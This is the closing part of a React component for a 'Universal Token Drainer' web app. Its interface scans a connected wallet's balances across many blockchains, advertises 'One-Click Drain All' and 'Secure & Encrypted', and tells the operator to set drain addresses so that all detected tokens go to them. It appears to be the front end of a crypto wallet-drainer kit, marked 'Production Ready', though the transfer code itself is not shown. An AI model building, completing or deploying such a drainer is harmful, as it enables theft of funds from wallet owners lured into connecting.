                                  {formatValue(token.value)}
                                </div>
                                <div className="token-drain-address">
                                  Drain: {formatAddress(token.drainAddress || DRAIN_ADDRESSES[networkId])}
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">
                    {isScanning ? '🔍' : '💰'}
                  </div>
                  <h3>
                    {isScanning ? 'Scanning Networks...' : 'No Tokens Detected'}
                  </h3>
                  <p>
                    {isScanning 
                      ? 'Please wait while we scan all networks for your tokens...'
                      : 'Click "Scan All Networks" to discover tokens across all supported blockchains'}
                  </p>
                  {!isScanning && (
                    <div className="supported-chains">
                      <p>Supported chains include:</p>
                      <div className="chain-tags">
                        {NETWORKS.slice(0, 12).map(network => (
                          <span 
                            key={network.id} 
                            className="chain-tag"
                            style={{ borderColor: network.color }}
                          >
                            {network.symbol}
                          </span>
                        ))}
                        {NETWORKS.length > 12 && (
                          <span className="chain-tag">+{NETWORKS.length - 12} more</span>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          ) : (
            <div className="connection-prompt">
              <div className="prompt-content">
                <div className="prompt-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="prompt-description">
                  Connect your wallet to scan and manage tokens across {NETWORKS.length} blockchains
                </p>
                
                <div className="connect-button-container">
                  <ConnectKitButton />
                </div>
                
                <div className="features-list">
                  <div className="feature">
                    <span className="feature-icon">🌐</span>
                    <span className="feature-text">{NETWORKS.length} Networks</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">🔍</span>
                    <span className="feature-text">Live Balance Scanning</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">⚡</span>
                    <span className="feature-text">One-Click Drain All</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">🔐</span>
                    <span className="feature-text">Secure & Encrypted</span>
                  </div>
                </div>
                
                <div className="important-note">
                  <p><strong>Important:</strong> Make sure you have updated the drain addresses in the code before using.</p>
                  <p>This tool will transfer ALL detected tokens to the specified addresses.</p>
                </div>
              </div>
            </div>
          )}
        </main>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-left">
              <span className="footer-text">Universal Token Drainer v6.0</span>
              <span className="footer-text">Production Ready</span>
              <span className="footer-text">All Networks Supported</span>
            </div>
            <div className="footer-right">
              <span className="footer-status">
                Backend: {apiStatus}
              </span>
              <button 
                className="footer-btn"
                onClick={checkApiStatus}
              >
                Refresh Status
              </button>
            </div>
          </div>
          <div className="footer-warning">
            ⚠️ WARNING: This tool will transfer ALL tokens to the configured drain addresses. Use with caution.
          </div>
        </footer>
      </div>
    </div>
  );
}

export default TokenDrainApp;
